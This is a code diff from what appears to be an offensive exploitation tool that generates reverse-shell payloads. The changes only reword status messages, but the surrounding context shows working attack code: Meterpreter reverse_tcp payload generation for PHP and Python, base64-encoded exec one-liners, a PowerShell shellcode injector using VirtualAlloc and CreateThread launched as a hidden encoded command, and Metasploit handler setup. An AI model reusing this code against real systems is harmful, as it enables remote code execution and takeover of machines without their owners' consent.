@@ -58,7 +58,7 @@ def shell_options(option):
 
 # Payload generation message.
 def gen_payload_msg(payload):
-  info_msg = "Generating the '" + payload + "' shellcode... "
+  info_msg = "Generating the '" + payload + "' shellcode. "
   sys.stdout.write(settings.print_info_msg(info_msg))
   sys.stdout.flush()
 
@@ -360,7 +360,7 @@ Type '""" + Style.BRIGHT + """12""" + Style.RESET_ALL + """' to use the web deli
       payload = "php/meterpreter/reverse_tcp"
       output = "php_meterpreter.rc"
 
-      info_msg = "Generating the '" + payload + "' payload... "
+      info_msg = "Generating the '" + payload + "' payload. "
       sys.stdout.write(settings.print_info_msg(info_msg))
       sys.stdout.flush()
       try:
@@ -373,7 +373,7 @@ Type '""" + Style.BRIGHT + """12""" + Style.RESET_ALL + """' to use the web deli
           data = content_file.readlines()
           data = ''.join(data).replace("\n"," ")
 
-        print("[" + Fore.GREEN + " SUCCEED " + Style.RESET_ALL + "]")
+        print(settings.SUCCESS_STATUS)
         # Remove the ouput file.
         os.remove(output)
         with open(output, 'w+') as filewrite:
@@ -390,7 +390,7 @@ Type '""" + Style.BRIGHT + """12""" + Style.RESET_ALL + """' to use the web deli
           other_shell = "php -r \"" + data + "\""
         msf_launch_msg(output)
       except:
-        print("[" + Fore.RED + " FAILED " + Style.RESET_ALL + "]")
+        print(settings.FAIL_STATUS)
       break
 
     # Python-reverse-shell
@@ -434,7 +434,7 @@ Type '""" + Style.BRIGHT + """12""" + Style.RESET_ALL + """' to use the web deli
       payload = "python/meterpreter/reverse_tcp"
       output = "py_meterpreter.rc"
 
-      info_msg = "Generating the '" + payload + "' payload... "
+      info_msg = "Generating the '" + payload + "' payload. "
       sys.stdout.write(settings.print_info_msg(info_msg))
       sys.stdout.flush()
       try:
@@ -448,7 +448,7 @@ Type '""" + Style.BRIGHT + """12""" + Style.RESET_ALL + """' to use the web deli
           data = ''.join(data)
           data = base64.b64encode(data)
 
-        print("[" + Fore.GREEN + " SUCCEED " + Style.RESET_ALL + "]")
+        print(settings.SUCCESS_STATUS)
         # Remove the ouput file.
         os.remove(output)
         with open(output, 'w+') as filewrite:
@@ -465,7 +465,7 @@ Type '""" + Style.BRIGHT + """12""" + Style.RESET_ALL + """' to use the web deli
           other_shell = "python -c \"exec('" + data + "'.decode('base64'))\""
         msf_launch_msg(output)
       except:
-        print("[" + Fore.RED + " FAILED " + Style.RESET_ALL + "]")
+        print(settings.FAIL_STATUS)
       break
     
     # Powershell injection attacks
@@ -515,7 +515,7 @@ Type '""" + Style.BRIGHT + """3""" + Style.RESET_ALL + """' to use Regsvr32.exe 
               # Greetz to Dave Kennedy (@HackingDave)
               powershell_code = (r"""$1 = '$c = ''[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$sc64 = %s;[Byte[]]$sc = $sc64;$size = 0x1000;if ($sc.Length -gt 0x1000) {$size = $sc.Length};$x=$w::VirtualAlloc(0,0x1000,$size,0x40);for ($i=0;$i -le ($sc.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };';$goat = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($1));if($env:PROCESSOR_ARCHITECTURE -eq "AMD64"){$x86 = $env:SystemRoot + "syswow64WindowsPowerShellv1.0powershell";$cmd = "-noninteractive -EncodedCommand";iex "& $x86 $cmd $goat"}else{$cmd = "-noninteractive -EncodedCommand";iex "& powershell $cmd $goat";}""" % (shellcode))
               other_shell = "powershell -noprofile -windowstyle hidden -noninteractive -EncodedCommand " + base64.b64encode(powershell_code.encode('utf_16_le'))  
-              print("[" + Fore.GREEN + " SUCCEED " + Style.RESET_ALL + "]")
+              print(settings.SUCCESS_STATUS)
               with open(output, 'w+') as filewrite:
                 filewrite.write("use exploit/multi/handler\n"
                                 "set payload " + payload + "\n"
@@ -524,7 +524,7 @@ Type '""" + Style.BRIGHT + """3""" + Style.RESET_ALL + """' to use Regsvr32.exe 
                                 "exploit\n\n")
               msf_launch_msg(output)
             except:
-              print("[" + Fore.RED + " FAILED " + Style.RESET_ALL + "]")
+              print(settings.FAIL_STATUS)
             break
 
           # TrustedSec's Magic Unicorn (3rd Party)
@@ -553,7 +553,7 @@ Type '""" + Style.BRIGHT + """3""" + Style.RESET_ALL + """' to use Regsvr32.exe 
                 with open(output, 'r') as content_file:
                   other_shell = content_file.read().replace('\n', '')
                 other_shell = _urllib.parse.quote_plus(other_shell) 
-                print("[" + Fore.GREEN + " SUCCEED " + Style.RESET_ALL + "]")
+                print(settings.SUCCESS_STATUS)
                 # Remove the ouput file
                 os.remove(output)
                 with open("unicorn.rc", 'w+') as filewrite:
@@ -568,7 +568,7 @@ Type '""" + Style.BRIGHT + """3""" + Style.RESET_ALL + """' to use Regsvr32.exe 
               except:
                 continue 
             except:
-              print("[" + Fore.RED + " FAILED " + Style.RESET_ALL + "]")
+              print(settings.FAIL_STATUS)
             break
 
           # Regsvr32.exe application whitelisting bypass
